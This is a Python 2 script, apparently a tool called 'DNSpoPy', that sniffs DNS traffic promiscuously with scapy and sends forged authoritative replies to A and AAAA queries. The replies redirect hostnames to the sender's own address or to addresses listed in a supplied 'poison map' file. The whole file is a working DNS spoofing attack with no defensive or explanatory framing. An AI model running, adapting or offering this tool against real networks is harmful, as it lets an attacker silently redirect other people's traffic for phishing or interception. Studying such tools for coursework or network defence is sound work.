#import pcap
#import dpkt
#import dnet
from scapy.all import *
from scapy.all import send as ssend
import getopt
import netifaces

conf.sniff_promisc=True
lo_addr = '127.0.0.1'
hostnames_specified = False
poison_map = {}
def poison_cache(pkt):
	global hostnames_specified
	global lo_addr
	if IP in pkt:
		ip_src = pkt[IP].src
		ip_dst = pkt[IP].dst
		if pkt.haslayer(DNSQR) and pkt.getlayer(DNS).qr == 0 and pkt[DNS].opcode == 0L and pkt[DNS].ancount == 0 and pkt[DNS].qd.qtype in {1, 28}:
			print str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + pkt.getlayer(DNS).qd.qname + ")"
			pkt[UDP].chksum = None
			query = pkt[DNS].qd
			print query.qname	
			if (hostnames_specified and (query.qname in poison_map.keys())):
				poison_addr = poison_map[query.qname]
				print "Preparing spoofed packet"	
			else:
				poison_addr = lo_addr
			spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                     		UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                     		DNS(id=pkt[DNS].id, qd=query, aa = 1, ancount = 1, qr=1, \
                     		an=DNSRR(rrname=query.qname, ttl=330, rdata=poison_addr))
			send(spoofed_pkt, iface="enp0s5")
			print 'Sent:', spoofed_pkt.summary()

def main():
	global hostnames_specified
	global lo_addr
	interface = netifaces.gateways()['default'][netifaces.AF_INET][1]
	lo_addr = netifaces.ifaddresses(str(interface))[netifaces.AF_INET][0]['addr']
	try:
		opt, exp = getopt.getopt(sys.argv[1:], "i:h:", ["interface", "hostname"])
	
	except getopt.GetoptError as err:
		print "DNSpoPy: Usage Error:",
		print str(err)
		sys.exit(2)
	
	for o, a in opt:
		if o in ("-i", "--interface"):
			interface = a
#			print "Listening on interface: " + a
		elif o in ("-h", "--hostname"):
			hostnames_specified = True
#			print "Poison file: " + a
			host_file = a
		else:
			assert False, "Option not recognized"
	if hostnames_specified:
		print "Trying to read cache poisoning data from file " + host_file + " ..."
		try:
			with open(host_file, "r") as hostfile:
				for each_entry in hostfile:
					dns_map = each_entry.split()
					poison_map[dns_map[1] + "."] = dns_map[0]
			print "Poison Map: " + str(poison_map)
		except IOError:
			print "DNSpoPy: No such file found: " + host_file
			return
	fexp = 'port 53'
	if len(exp) > 0:
		fexp += ' and ' + ' '.join(exp)
	print "Sniffing on packets on interface: "+ str(interface)
	try:
		sniff(iface = str(interface), filter = fexp, prn = poison_cache, store = 0)
	except:
		print "DNSpoPy: Invalid arguments to sniffer module. Are you root ?"
		return
if __name__ == "__main__":
	main()

